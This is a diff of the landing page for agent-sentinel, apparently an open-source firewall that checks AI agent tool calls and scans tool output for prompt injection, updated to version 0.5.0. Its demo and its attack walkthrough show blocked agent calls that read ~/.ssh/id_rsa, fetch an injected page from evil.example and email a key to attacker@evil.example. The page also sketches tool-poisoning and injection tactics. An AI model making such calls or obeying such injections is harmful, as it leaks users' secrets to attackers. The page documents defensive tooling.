@@ -42,12 +42,12 @@
       "@type": "SoftwareApplication",
       "@id": "https://farooqazamdogar.github.io/agent-sentinel/#software",
       "name": "agent-sentinel",
-      "description": "An open-source security layer between an AI agent and the tools it uses. It checks every tool call against a permission policy, scans everything a tool server sends for prompt injection, and writes an audit log. It works as a Python library or as a proxy in front of any MCP server that uses stdio.",
+      "description": "An open-source security layer between an AI agent and the tools it uses. It checks every tool call against a permission policy, scans everything a tool server sends for prompt injection, stops secrets from leaving, and writes an audit log. It works as a Python library, as Claude Code hooks, or as a proxy in front of any MCP server that uses stdio.",
       "url": "https://farooqazamdogar.github.io/agent-sentinel/",
       "applicationCategory": "SecurityApplication",
       "operatingSystem": "Cross-platform (any system with Python 3.10 or newer)",
       "softwareRequirements": "Python 3.10 or newer",
-      "softwareVersion": "0.4.1",
+      "softwareVersion": "0.5.0",
       "license": "https://opensource.org/licenses/MIT",
       "isAccessibleForFree": true,
       "downloadUrl": "https://github.com/FarooqAzamdogar/agent-sentinel",
@@ -107,7 +107,7 @@
       "name": "Will it slow my agent down?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "Scanning is linear-time pattern matching that runs on your own machine, and it makes no network calls. No benchmark numbers are published yet."
+        "text": "Scanning is linear-time pattern matching that runs on your own machine, and it makes no network calls. In Claude Code, each hook run starts a new Python process, which adds about a tenth to a third of a second to a tool call. No benchmark numbers are published yet."
       }
     },
     {
@@ -123,7 +123,7 @@
       "name": "Is it production ready?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "Not yet. Version 0.4.1 is an alpha release. It has not been tested against a wide range of third-party MCP servers and has had no independent audit. Start in monitor mode, read the limits, and treat it as one layer of defense."
+        "text": "Not yet. Version 0.5.0 is an alpha release. It has not been tested against a wide range of third-party MCP servers and has had no independent audit. Start in monitor mode, read the limits, and treat it as one layer of defense."
       }
     },
     {
@@ -131,15 +131,15 @@
       "name": "How is it different from a prompt-injection classifier?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "A classifier tries to detect an attack in text. agent-sentinel also enforces permissions on every tool call, and those permissions do not depend on detecting the attack. If an injection gets past the scanner, the policy still decides what the agent is allowed to do."
+        "text": "A classifier tries to detect an attack in text. agent-sentinel also enforces permissions on every tool call, and those permissions do not depend on detecting the attack. If an injection gets past the scanner, the policy and its flow rules still decide what the agent is allowed to do."
       }
     },
     {
       "@type": "Question",
-      "name": "Which MCP servers does it work with?",
+      "name": "Which clients and servers does it work with?",
       "acceptedAnswer": {
         "@type": "Answer",
-        "text": "Any MCP server that uses the stdio transport can be placed behind the proxy. HTTP is not supported yet. It has not been tested against a wide range of third-party servers, so reports of what works and what breaks are welcome."
+        "text": "The proxy works in front of any MCP server that uses the stdio transport, and the wrap command sets it up for Claude Desktop, Claude Code, Cursor, VS Code and Windsurf. Claude Code can also run it as hooks. HTTP servers are not supported yet. It has not been tested against a wide range of third-party servers, so reports of what works and what breaks are welcome."
       }
     }
   ]
@@ -222,7 +222,7 @@
   <section class="hero" id="top" aria-labelledby="hero-title">
     <div class="container hero__inner">
       <div class="hero__copy">
-        <p class="hero__eyebrow"><span class="pill pill--accent">v0.4.1 alpha</span> Open-source security for AI agents and MCP</p>
+        <p class="hero__eyebrow"><span class="pill pill--accent">v0.5.0 alpha</span> Open-source security for AI agents and MCP</p>
         <h1 id="hero-title">A security layer between your AI agent and the tools it uses.</h1>
         <p class="hero__lead">It checks <span class="hl hl--mint">what your AI agent is about to do</span>, and <span class="hl hl--cyan">what it is about to read</span>, before either can <span class="hl hl--pink">cause harm</span>. <span class="hl">You write the rules</span>, and it runs on your own machine.</p>
 
@@ -254,9 +254,9 @@
           <li class="badge">MIT license</li>
           <li class="badge">Python 3.10+</li>
           <li class="badge">Zero dependencies</li>
-          <li class="badge">420 automated tests</li>
+          <li class="badge">1,882 automated tests</li>
           <li class="badge">MCP proxy over stdio</li>
-          <li class="badge">Alpha release</li>
+          <li class="badge">Claude Code hooks</li>
         </ul>
         <p class="hero__note">This is an early release. Read <a href="#limits">what it does not do</a> before you rely on it.</p>
       </div>
@@ -316,7 +316,7 @@
           <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-log"/></svg></span>
           <div>
             <h3 class="plain__title">Records every decision</h3>
-            <p>Each call it allows or blocks is written to a log on your machine, with the reason.</p>
+            <p>Each call it allows or blocks is written to a log on your machine, with the reason and a short reference.</p>
           </div>
         </li>
       </ul>
@@ -470,7 +470,7 @@
                 <code class="verdict__call">agent calls send_email({'to': 'attacker@evil.example', ...})</code>
                 <div class="verdict__row">
                   <span class="status status--bad"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-x"/></svg>BLOCKED</span>
-                  <span class="verdict__reason">argument 'to' has a value the policy does not allow</span>
+                  <span class="verdict__reason">argument 'to' has a value the policy does not permit</span>
                 </div>
               </div>
             </div>
@@ -483,7 +483,7 @@
             <div class="story__text">
               <p class="story__kicker"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-key"/></svg> Checkpoint 3: the secret guard</p>
               <h3 class="story__title">The call carries something shaped like a key.</h3>
-              <p>A separate check looks at what a call contains. Anything that looks like an API key or a private key is refused, whatever the address.</p>
+              <p>A separate check looks at what a call contains. Anything that looks like an API key, a private key, a value you named, or a canary you planted is refused, whatever the address.</p>
               <p class="story__stop"><svg class="icon" aria-hidden="true" focusable="false" width="16" height="16"><use href="#i-shield"/></svg> Stopped here, even when the address is allowed</p>
             </div>
             <div class="story__visual">
@@ -504,7 +504,7 @@
             <div class="story__text">
               <p class="story__kicker">The record</p>
               <h3 class="story__title">Every step is in the audit log.</h3>
-              <p>Each decision is one line: what was tried, what was decided, and why. Keys and tokens it recognizes are redacted.</p>
+              <p>Each decision is one line: what was tried, which rule decided, and why. The agent's refusal ends with a short reference, such as <code>(ref 7f3a9c21)</code>, and <code>agent-sentinel explain</code> finds the line it belongs to. Keys and tokens it recognizes are redacted.</p>
             </div>
             <div class="story__visual">
               <div class="mock">
@@ -514,7 +514,7 @@
                 </div>
                 <ul class="log">
                   <li><span class="log__tool">fetch_page</span><span class="status status--bad">block</span><span class="log__why">possible prompt injection</span></li>
-                  <li><span class="log__tool">send_email</span><span class="status status--bad">block</span><span class="log__why">argument 'to' has a value the policy does not allow</span></li>
+                  <li><span class="log__tool">send_email</span><span class="status status--bad">block</span><span class="log__why">argument 'to' has a value the policy does not permit</span></li>
                   <li><span class="log__tool">send_email</span><span class="status status--bad">block</span><span class="log__why">the call contains what looks like a secret (API key)</span></li>
                 </ul>
               </div>
@@ -523,7 +523,7 @@
         </li>
       </ol>
 
-      <p class="story__after">Any one of the three checks is enough to stop this attack. The scanner can miss new wording, so treat <span class="hl hl--mint">the policy as the part you rely on</span>. See <a href="#limits">what it does not do</a>.</p>
+      <p class="story__after">Any one of the three checks is enough to stop this attack. A flow rule adds a fourth: once the agent has read a web page and a private file, it may not send anything out for the rest of the session. The scanner can miss new wording, so treat <span class="hl hl--mint">the policy as the part you rely on</span>. See <a href="#limits">what it does not do</a>.</p>
     </div>
   </section>
 
@@ -650,57 +650,57 @@
         <li class="step">
           <span class="step__num" aria-hidden="true">1</span>
           <h3 class="step__title">Policy check</h3>
-          <p>Before a tool runs, the call is checked against your policy: allow, ask a human, or block. A blocked call never reaches the tool. A tool with no rule is denied.</p>
+          <p>Before a tool runs, the call is checked against your policy: allow, ask a human, or block. A blocked call never reaches the tool. A tool with no rule is denied, and a flow rule can refuse a call because of what the agent read earlier.</p>
         </li>
         <li class="step">
           <span class="step__num" aria-hidden="true">2</span>
           <h3 class="step__title">Injection scan</h3>
-          <p>Everything the tool server sends is normalized and scanned for injection patterns before the model reads it. Content that is flagged does not reach the model.</p>
+          <p>Everything the tool server sends is normalized and scanned before the model reads it. Tool descriptions get stricter rules. Flagged content does not reach the model, and secrets in results can be replaced.</p>
         </li>
         <li class="step">
           <span class="step__num" aria-hidden="true">3</span>
           <h3 class="step__title">Audit log</h3>
-          <p>Every tool call and everything that is blocked is written as one JSON line. You can see what was allowed, what was blocked, and why.</p>
+          <p>Every tool call and everything that is blocked is written as one JSON line, with the rule that decided. You can see what was allowed, what was blocked, and why.</p>
         </li>
       </ol>
 
       <div class="demo">
         <h3 class="demo__title">The demo, six tool calls</h3>
-        <p class="demo__lead">The repository includes a demo in which a pretend agent makes six calls. This is what agent-sentinel decides, one call per line.</p>
+        <p class="demo__lead">Run <code>agent-sentinel demo</code> and a pretend agent makes six calls through the library, then more through the proxy in front of a fake MCP server. This is what agent-sentinel decides for the first six, one call per line.</p>
         <p class="scribble scribble--demo">four blocked, two allowed <svg class="scribble__arrow" aria-hidden="true" focusable="false" viewBox="0 0 44 36" width="44" height="36"><use href="#i-scribble"/></svg></p>
-        <div class="terminal" role="group" aria-label="Output of python examples/demo.py">
+        <div class="terminal" role="group" aria-label="Output of agent-sentinel demo, first part">
           <div class="terminal__bar">
             <span class="terminal__dots" aria-hidden="true"><span></span><span></span><span></span></span>
-            <span class="terminal__title">python examples/demo.py</span>
+            <span class="terminal__title">agent-sentinel demo</span>
           </div>
           <ol class="terminal__lines">
             <li class="tline">
-              <code class="tline__call">agent calls read_file({'path': 'notes/todo.txt'})</code>
+              <code class="tline__call">agent calls read_file(path="notes/todo.txt")</code>
               <span class="status status--ok"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-check"/></svg>ALLOWED</span>
               <span class="tline__reason"></span>
             </li>
             <li class="tline">
-              <code class="tline__call">agent calls read_file({'path': '/home/me/.ssh/id_rsa'})</code>
+              <code class="tline__call">agent calls read_file(path="/home/me/.ssh/id_rsa")</code>
               <span class="status status--bad"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-x"/></svg>BLOCKED</span>
-              <span class="tline__reason">an argument has a value the policy denies</span>
+              <span class="tline__reason">argument 'path' has a value the policy does not permit</span>
             </li>
             <li class="tline">
-              <code class="tline__call">agent calls fetch_page({'url': 'https://evil.example/recipes'})</code>
+              <code class="tline__call">agent calls fetch_page(url="https://evil.example/recipes")</code>
               <span class="status status--bad"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-x"/></svg>BLOCKED</span>
               <span class="tline__reason">possible prompt injection; the content was withheld</span>
             </li>
             <li class="tline">
-              <code class="tline__call">agent calls send_email({'to': 'boss@example.com', ...})</code>
+              <code class="tline__call">agent calls send_email(to="boss@example.com", ...)</code>
               <span class="status status--ok"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-check"/></svg>ALLOWED</span>
               <span class="tline__reason">after human approval</span>
             </li>
             <li class="tline">
-              <code class="tline__call">agent calls send_email({'to': 'attacker@evil.example', ...})</code>
+              <code class="tline__call">agent calls send_email(to="attacker@evil.example", ...)</code>
               <span class="status status--bad"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-x"/></svg>BLOCKED</span>
-              <span class="tline__reason">argument 'to' has a value the policy does not allow</span>
+              <span class="tline__reason">argument 'to' has a value the policy does not permit</span>
             </li>
             <li class="tline">
-              <code class="tline__call">agent calls delete_file({'path': 'notes/todo.txt'})</code>
+              <code class="tline__call">agent calls delete_file(path="notes/todo.txt")</code>
               <span class="status status--bad"><svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-x"/></svg>BLOCKED</span>
               <span class="tline__reason">this call is not permitted by the policy</span>
             </li>
@@ -715,8 +715,8 @@
     <div class="container">
       <header class="section__head">
         <p class="eyebrow"><span class="eyebrow__num">04</span> Features</p>
-        <h2 id="features-title">What is in version 0.4.1</h2>
-        <p class="section__lead">Guardrails for the tools an LLM agent can call, written as <span class="hl">rules you can read and test</span>. The project has 420 automated tests.</p>
+        <h2 id="features-title">What is in version 0.5.0</h2>
+        <p class="section__lead">Guardrails for the tools an LLM agent can call, written as <span class="hl">rules you can read and test</span>. The project has 1,882 automated tests, run on Linux and Windows with Python 3.10 to 3.13.</p>
       </header>
 
       <div class="grid grid--3 features">
@@ -731,12 +731,13 @@
           </div>
           <ul class="ticks">
             <li>Wildcard tool names, such as <code>search_*</code></li>
-            <li>Deny patterns that look inside nested arguments and percent-encoded spellings</li>
-            <li>Allow patterns that must match the whole value</li>
-            <li>Policy-wide deny rules</li>
-            <li>Closed argument lists</li>
+            <li>Typed argument rules: folders a path must stay in, hosts a URL may reach, domains an email may go to</li>
+            <li>Exact values, prefixes and endings, and values that may not start with a dash</li>
+            <li>Deny rules that look inside nested arguments and percent-encoded spellings</li>
+            <li>Allow rules that must accept the whole value</li>
+            <li>Policy-wide deny rules and closed argument lists</li>
             <li>Per-tool and global rate limits</li>
-            <li>Strict loading: a typo or duplicate key is an error, not a silently weaker policy</li>
+            <li>Strict loading, with errors that point at the line and suggest the word you meant</li>
           </ul>
         </article>
 
@@ -746,8 +747,8 @@
             <h3 class="card__title">Prompt-injection scanning</h3>
           </div>
           <p class="feature__sum">Scans everything a tool server sends before the model reads it.</p>
-          <p>That covers tool results, tool descriptions and schemas, server instructions, resources, prompts, and requests the server makes to the model.</p>
-          <p>Text is normalized first, so cheap disguises fail: invisible characters, look-alike letters, accents, HTML entities, percent-encoding, and text split across fields.</p>
+          <p>Tool descriptions and server instructions get stricter rules, which catch orders to read key files or to copy the conversation into an argument.</p>
+          <p>Cheap disguises fail: invisible and tag characters, look-alike letters, HTML entities, percent-encoding, base64 and hex, and text split across fields.</p>
         </article>
 
         <article class="card feature feature--yellow">
@@ -755,8 +756,8 @@
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-warn"/></svg></span>
             <h3 class="card__title">Tool poisoning defense</h3>
           </div>
-          <p class="feature__sum">A poisoned tool is removed from the tool list and quarantined.</p>
-          <p>That means a tool whose description contains hidden instructions, and a tool whose definition changes after it was first seen, known as a rug pull.</p>
+          <p class="feature__sum">A poisoned or changed tool is removed and quarantined.</p>
+          <p>Tools, prompts, templates and server instructions are pinned when first seen. A change, known as a rug pull, is caught across restarts, and <code>pins diff</code> shows what changed. Look-alike tool names and unsafe icons are removed too.</p>
         </article>
 
         <article class="card feature feature--pink">
@@ -765,39 +766,66 @@
             <h3 class="card__title">Secret-leak guard</h3>
           </div>
           <p class="feature__sum">A call that carries a secret is blocked.</p>
-          <p>It looks for arguments that contain what looks like a private key or an API token. Recognizable keys and tokens are also redacted from the audit log.</p>
+          <p>It knows the tokens of about thirty services, also when encoded or split over two arguments, plus values you name, canaries you plant and formats you define. It can also replace secrets in what tools return.</p>
         </article>
 
         <article class="card feature feature--mint">
           <div class="feature__head">
-            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-log"/></svg></span>
-            <h3 class="card__title">Audit log and monitor mode</h3>
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-block"/></svg></span>
+            <h3 class="card__title">Flow rules</h3>
           </div>
-          <p class="feature__sum">Every tool call and every block is one JSON line.</p>
-          <p>The <code>report</code> command summarizes a log. Monitor mode logs what would be blocked without blocking, so you can tune a policy safely. It protects nothing while it is on.</p>
+          <p class="feature__sum">It remembers what the agent has read.</p>
+          <p>Label tools as <code>untrusted</code>, <code>private</code> or <code>sink</code>. Once the agent has read a web page and a private file, a flow rule refuses every call that could send data out, for the rest of the session.</p>
+        </article>
+
+        <article class="card feature feature--cyan">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-code"/></svg></span>
+            <h3 class="card__title">Claude Code hooks</h3>
+          </div>
+          <p class="feature__sum">Checks Claude Code's own tools too.</p>
+          <p>Installed as hooks, it checks Read, Edit, Bash, WebFetch and MCP tools before they run, and scans what web and MCP tools return. An ask uses Claude Code's own prompt.</p>
+        </article>
+
+        <article class="card feature feature--yellow">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-user"/></svg></span>
+            <h3 class="card__title">Human approval</h3>
+          </div>
+          <p class="feature__sum">An ask rule waits for a person.</p>
+          <p>The proxy asks in a dialog on your machine, in a form in the MCP client, or through a program you choose. Every argument is shown. No answer means no.</p>
+        </article>
+
+        <article class="card feature feature--yellow">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-terminal"/></svg></span>
+            <h3 class="card__title">Set up in minutes</h3>
+          </div>
+          <p class="feature__sum">Commands do the setup for you.</p>
+          <dl class="cmds">
+            <div><dt><code>init</code></dt><dd>writes a first policy from a template</dd></div>
+            <div><dt><code>wrap</code></dt><dd>puts the proxy in front of a client's servers</dd></div>
+            <div><dt><code>doctor</code></dt><dd>checks that every server is protected</dd></div>
+            <div><dt><code>check</code></dt><dd>tries a call against a policy</dd></div>
+          </dl>
         </article>
 
         <article class="card feature feature--pink">
+          <div class="feature__head">
+            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-log"/></svg></span>
+            <h3 class="card__title">Audit log you can ask</h3>
+          </div>
+          <p class="feature__sum">Every tool call and every block is one JSON line.</p>
+          <p><code>report</code> summarizes it, <code>explain</code> turns a reference into the rule and how to change it, and <code>suggest</code> drafts rules from a monitor-mode run. Monitor mode blocks nothing, so it protects nothing while it is on.</p>
+        </article>
+
+        <article class="card feature feature--mint card--tablet-wide">
           <div class="feature__head">
             <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-lock"/></svg></span>
             <h3 class="card__title">Fails closed</h3>
           </div>
           <p class="feature__sum">When it cannot check a message, it drops it.</p>
-          <p>Anything the proxy cannot parse, match to a request, or check is dropped. It is never forwarded.</p>
-        </article>
-
-        <article class="card feature feature--cyan">
-          <div class="feature__head">
-            <span class="tile-icon"><svg class="icon" aria-hidden="true" focusable="false" width="20" height="20"><use href="#i-terminal"/></svg></span>
-            <h3 class="card__title">Command line</h3>
-          </div>
-          <p class="feature__sum">Four commands cover daily use.</p>
-          <dl class="cmds">
-            <div><dt><code>proxy</code></dt><dd>runs an MCP server behind your policy</dd></div>
-            <div><dt><code>scan</code></dt><dd>checks a file for injection patterns</dd></div>
-            <div><dt><code>validate</code></dt><dd>checks a policy</dd></div>
-            <div><dt><code>report</code></dt><dd>summarizes an audit log</dd></div>
-          </dl>
+          <p>Anything the proxy cannot parse, match to a request, or check is dropped, and what it forwards is rebuilt from what it checked. It knows the MCP revisions from 2024-11-05 to 2026-07-28 and refuses the rest.</p>
         </article>
       </div>
     </div>
@@ -808,7 +836,7 @@
     <div class="container">
       <header class="section__head">
         <p class="eyebrow"><span class="eyebrow__num">05</span> Quick start</p>
-        <h2 id="quick-title">Install it, pick a mode, write a policy.</h2>
+        <h2 id="quick-title">Install it, protect your agent, write a policy.</h2>
         <p class="section__lead">agent-sentinel needs <span class="hl hl--cyan">Python 3.10 or newer and nothing else</span>. It is not on PyPI yet, so install it from GitHub.</p>
       </header>
 
@@ -828,47 +856,55 @@
             </div>
             <div class="code">
               <div class="code__bar">
-                <span class="code__label">Or run the demo first</span>
+                <span class="code__label">Then see it work</span>
                 <button type="button" class="copy" data-copy>
                   <svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-copy"/></svg>
-                  <span data-copy-label>Copy</span><span class="visually-hidden"> demo commands</span>
+                  <span data-copy-label>Copy</span><span class="visually-hidden"> demo command</span>
                 </button>
               </div>
-              <pre tabindex="0"><code>git clone https://github.com/FarooqAzamdogar/agent-sentinel.git
-cd agent-sentinel
-python examples/demo.py</code></pre>
+              <pre tabindex="0"><code>agent-sentinel demo</code></pre>
             </div>
           </div>
+          <p class="note">Install it into a Python you will keep: <code>wrap</code> writes the full path of that Python into your client's settings.</p>
         </div>
 
         <div class="qs__step">
-          <h3 class="qs__title"><span class="qs__num" aria-hidden="true">2</span> Pick a mode</h3>
-          <p class="qs__text">Use it as a drop-in proxy in front of any MCP server that uses stdio, or as a Python library around your own tools.</p>
+          <h3 class="qs__title"><span class="qs__num" aria-hidden="true">2</span> Protect your agent</h3>
+          <p class="qs__text">Put the proxy in front of the MCP servers of a client such as Claude Desktop, add hooks to Claude Code, or wrap your own tools in Python.</p>
 
           <div class="tabs" data-tabs>
             <div class="tabs__list" data-tablist aria-label="Ways to use agent-sentinel">
-              <button type="button" class="tabs__tab" id="tab-proxy" data-tab="panel-proxy">MCP proxy</button>
+              <button type="button" class="tabs__tab" id="tab-client" data-tab="panel-client">MCP client</button>
+              <button type="button" class="tabs__tab" id="tab-claude-code" data-tab="panel-claude-code">Claude Code</button>
               <button type="button" class="tabs__tab" id="tab-library" data-tab="panel-library">Python library</button>
               <button type="button" class="tabs__tab" id="tab-cli" data-tab="panel-cli">Command line</button>
             </div>
 
-            <div class="tabs__panel" id="panel-proxy" data-panel>
-              <h4 class="tabs__heading">Put the proxy in front of an MCP server</h4>
-              <p>Put the proxy command where the server command used to be. The client talks to the proxy, and the proxy talks to the server.</p>
+            <div class="tabs__panel" id="panel-client" data-panel>
+              <h4 class="tabs__heading">Put the proxy in front of your MCP servers</h4>
+              <p>Write a first policy, look at the change to your client's settings, then make it. A backup is made first. Use <code>claude-desktop</code>, <code>claude-code</code>, <code>cursor</code>, <code>vscode</code> or <code>windsurf</code> as the client.</p>
               <div class="code">
                 <div class="code__bar">
                   <span class="code__label">Shell</span>
                   <button type="button" class="copy" data-copy>
                     <svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-copy"/></svg>
-                    <span data-copy-label>Copy</span><span class="visually-hidden"> proxy command</span>
+                    <span data-copy-label>Copy</span><span class="visually-hidden"> setup commands</span>
                   </button>
                 </div>
-                <pre tabindex="0"><code>agent-sentinel proxy --policy policy.json --audit audit.jsonl -- npx some-mcp-server</code></pre>
+                <pre tabindex="0"><code><span class="t-c"># 1. Write a first policy (it prints the full path)</span>
+agent-sentinel init --template starter
+
+<span class="t-c"># 2. See the change to Claude Desktop's settings, then make it</span>
+agent-sentinel wrap --client claude-desktop --policy ~/.agent-sentinel/policy.json
+agent-sentinel wrap --client claude-desktop --policy ~/.agent-sentinel/policy.json --apply
+
+<span class="t-c"># 3. Restart the client, then check that every server is protected</span>
+agent-sentinel doctor</code></pre>
               </div>
-              <p>The same thing in an MCP client configuration:</p>
+              <p>On Windows, write the full path that <code>init</code> printed, such as <code>C:\Users\me\.agent-sentinel\policy.json</code>. To set up a client by hand, use full paths everywhere, and write each backslash twice in JSON:</p>
               <div class="code">
                 <div class="code__bar">
-                  <span class="code__label">JSON</span>
+                  <span class="code__label">claude_desktop_config.json</span>
                   <button type="button" class="copy" data-copy>
                     <svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-copy"/></svg>
                     <span data-copy-label>Copy</span><span class="visually-hidden"> client configuration</span>
@@ -876,20 +912,48 @@ python examples/demo.py</code></pre>
                 </div>
                 <pre tabindex="0"><code>{
   <span class="t-k">"mcpServers"</span>: {
-    <span class="t-k">"files"</span>: {
-      <span class="t-k">"command"</span>: <span class="t-s">"agent-sentinel"</span>,
-      <span class="t-k">"args"</span>: [<span class="t-s">"proxy"</span>, <span class="t-s">"--policy"</span>, <span class="t-s">"policy.json"</span>, <span class="t-s">"--audit"</span>, <span class="t-s">"audit.jsonl"</span>,
-               <span class="t-s">"--"</span>, <span class="t-s">"npx"</span>, <span class="t-s">"some-mcp-server"</span>]
+    <span class="t-k">"filesystem"</span>: {
+      <span class="t-k">"command"</span>: <span class="t-s">"C:\\Users\\me\\AppData\\Local\\Programs\\Python\\Python313\\python.exe"</span>,
+      <span class="t-k">"args"</span>: [
+        <span class="t-s">"-I"</span>, <span class="t-s">"-m"</span>, <span class="t-s">"agent_sentinel"</span>, <span class="t-s">"proxy"</span>,
+        <span class="t-s">"--policy"</span>, <span class="t-s">"C:\\Users\\me\\.agent-sentinel\\policy.json"</span>,
+        <span class="t-s">"--audit"</span>, <span class="t-s">"C:\\Users\\me\\.agent-sentinel\\audit.jsonl"</span>,
+        <span class="t-s">"--pins"</span>, <span class="t-s">"C:\\Users\\me\\.agent-sentinel\\pins\\filesystem.json"</span>,
+        <span class="t-s">"--name"</span>, <span class="t-s">"filesystem"</span>,
+        <span class="t-s">"--"</span>, <span class="t-s">"npx"</span>, <span class="t-s">"-y"</span>, <span class="t-s">"@modelcontextprotocol/server-filesystem"</span>,
+        <span class="t-s">"C:\\Users\\me\\Documents"</span>
+      ]
     }
   }
 }</code></pre>
               </div>
-              <p class="note">To tune a policy first, add <code>--monitor</code>. It logs what would be blocked and blocks nothing. Proxy mode supports the stdio transport, and human approval is not yet available in it.</p>
+              <p class="note">To watch before you enforce, add <code>--monitor</code> to <code>wrap</code>: it logs what would be blocked and blocks nothing. Calls the policy says "ask" for are refused unless the proxy has an approver (<code>--approve-with dialog</code>).</p>
+            </div>
+
+            <div class="tabs__panel" id="panel-claude-code" data-panel>
+              <h4 class="tabs__heading">Check Claude Code's own tools with hooks</h4>
+              <p>In hook mode the policy uses Claude Code's tool names: <code>Read</code>, <code>Edit</code>, <code>Bash</code>, <code>WebFetch</code>, and <code>mcp__github__create_issue</code> for an MCP tool. Print the hooks to add, or let agent-sentinel merge them into a settings file after a backup.</p>
+              <div class="code">
+                <div class="code__bar">
+                  <span class="code__label">Shell</span>
+                  <button type="button" class="copy" data-copy>
+                    <svg class="icon" aria-hidden="true" focusable="false" width="14" height="14"><use href="#i-copy"/></svg>
+                    <span data-copy-label>Copy</span><span class="visually-hidden"> hook commands</span>
+                  </button>
+                </div>
+                <pre tabindex="0"><code><span class="t-c"># Print the hooks (writes nothing)</span>
+agent-sentinel hook install claude-code --policy ~/.agent-sentinel/hook-policy.json
+
+<span class="t-c"># Show the change to your settings, then make it</span>
+agent-sentinel hook install claude-code --policy ~/.agent-sentinel/hook-policy.json --settings ~/.claude/settings.json
+agent-sentinel hook install claude-code --policy ~/.agent-sentinel/hook-policy.json --settings ~/.claude/settings.json --apply</code></pre>
+              </div>
+              <p class="note">Needs Claude Code v2.1.295 or later: each hook is installed so that a hook that cannot run blocks the call. "Ask" rules show Claude Code's own permission prompt, and are refused in bypassPermissions mode.</p>
             </div>
 
             <div class="tabs__panel" id="panel-library" data-panel>
               <h4 class="tabs__heading">Wrap your own tools in Python</h4>
-              <p>Run each tool through the firewall. It checks the call, runs your function, scans the result and returns it.</p>
+              <p>Decorate a tool function with <code>guard</code>. Each call is checked, the function runs, and its result is scanned before it is returned. <code>firewall.run</code> does the same without a decorator.</p>
               <div class="code">
                 <div class="code__bar">
                   <span class="code__label">Python</span>
@@ -898,21 +962,27 @@ python examples/demo.py</code></pre>
                     <span data-copy-label>Copy</span><span class="visually-hidden"> Python example</span>
                   </button>
                 </div>
-                <pre tabindex="0"><code><span class="t-k">from</span> agent_sentinel <span class="t-k">import</span> BlockedError, Firewall, Policy
+                <pre tabindex="0"><code><span class="t-k">from</span> agent_sentinel <span class="t-k">import</span> BlockedError, Firewall, Policy, guard
 
 firewall = Firewall(Policy.from_file(<span class="t-s">"policy.json"</span>), audit_path=<span class="t-s">"audit.jsonl"</span>)
 
+@guard(firewall)
+<span class="t-k">def</span> read_file(path: str, limit: int = 4000) -&gt; str:
+    <span class="t-s">"""Read the start of a text file."""</span>
+    <span class="t-k">with</span> open(path, encoding=<span class="t-s">"utf-8"</span>) <span class="t-k">as</span> file:
+        <span class="t-k">return</span> file.read(limit)
+
 <span class="t-k">try</span>:
-    result = firewall.run(<span class="t-s">"read_file"</span>, {<span class="t-s">"path"</span>: <span class="t-s">"notes.txt"</span>}, read_file)
-<span class="t-k">except</span> BlockedError <span class="t-k">as</span> reason:
-    result = <span class="t-s">f"Blocked: {reason}"</span></code></pre>
+    result = read_file(<span class="t-s">"notes.txt"</span>)
+<span class="t-k">except</span> BlockedError <span class="t-k">as</span> error:
+    result = str(error)   <span class="t-c"># safe to give to the agent</span></code></pre>
               </div>
-              <p class="note">When a call is blocked, give the agent the reason in place of the tool result.</p>
+              <p class="note">The text of a refusal never names the rule that decided. It ends with a reference, such as <code>(ref 7f3a9c21)</code>, that you can look up in the audit log. For the Claude Agent SDK, <code>claude_sdk_hooks(firewall)</code> gives ready hook callbacks.</p>
             </div>
 
             <div class="tabs__panel" id="panel-cli" data-panel>
               <h4 class="tabs__heading">Use the command line</h4>
-              <p>Installing the package adds the <code>agent-sentinel</code> command.</p>
+              <p>Installing the package adds the <code>agent-sentinel</code> command. Every command has <code>--help</code>.</p>
               <div class="code">
                 <div class="code__bar">
                   <span class="code__label">Shell</span>
@@ -921,17 +991,18 @@ firewall = Firewall(Policy.from_file(<span class="t-s">"policy.json"</span>), au
                     <span data-copy-label>Copy</span><span class="visually-hidden"> commands</span>
                   </button>
                 </div>
-                <pre tabindex="0"><code><span class="t-c"># Run an MCP server behind your policy</span>
-agent-sentinel proxy --policy policy.json --audit audit.jsonl -- npx some-mcp-server
+                <pre tabindex="0"><code><span class="t-c"># Try a call against a policy: which rule decides, and what the agent is told</span>
+agent-sentinel check policy.json send_email to=bob@example.com --show-rules
 
-<span class="t-c"># Scan a file for injection patterns</span>
-agent-sentinel scan page.txt
+<span class="t-c"># Run a policy's test cases, for CI</span>
+agent-sentinel test policy.json cases.json
 
-<span class="t-c"># Check a policy file</span>
-agent-sentinel validate policy.json
+<span class="t-c"># Summarize an audit log, and explain one refusal</span>
+agent-sentinel report audit.jsonl --since 2h
+agent-sentinel explain audit.jsonl --ref 7f3a9c21
 
-<span class="t-c"># Summarize an audit log</span>
-agent-sentinel report audit.jsonl</code></pre>
+<span class="t-c"># Scan a file for prompt injection</span>
+agent-sentinel scan page.html</code></pre>
               </div>
             </div>
           </div>
